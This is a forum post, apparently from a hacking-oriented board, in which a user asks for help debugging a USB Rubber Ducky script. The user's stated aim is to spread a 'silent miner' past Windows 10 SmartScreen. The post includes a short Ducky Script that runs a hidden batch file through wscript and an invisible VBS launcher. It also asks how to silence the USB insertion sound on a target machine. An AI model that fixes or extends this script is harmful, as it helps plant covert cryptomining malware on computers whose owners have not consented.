    <title>Need some help with Ducky Script</title>
    <link>https://d.clarkee.co.uk/t/need-some-help-with-ducky-script/11679</link>
    <description>Not sure if this is the right section or not but it seems the closest. I was following a guide given to be about spreading technique and I found this one more intriguing since I have a silent miner but it doesn&#39;t work on windows 10 with smart screen enabled. Something with zone.indentifier and windows ADS. I dunno. Anyways the guide is a few years old and the encoder page is no longer in service. I found a new one but get an error. Code below:

REM Name: RunEXE.txt
REM Purpose: Run an executable file off of the SD card after it mounts.
REM Encoder V2.4

ENTER
CONTROL Z
ENTER

REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs DuckyWait.bat
ENTER
STRING EXIT
ENTER

Using this encoder &quot;h xx ps://ducktoolkit dot com/encoder/&quot; I get the following error below:

Command &quot;DUCKY&quot;&#39;) Not in Language File

Any help would be much appreciated. I&#39;m sure it is something small and I&#39;m missing something but I know nothing how hardware talks to devices etc...

Also is there a way to make sure when the USB is plugged into the target that no noise goes off? When a USB is usually inserted into a PC running windows 7, 8 or 8.1.

Thanks in advance. Much appreciated.</description>
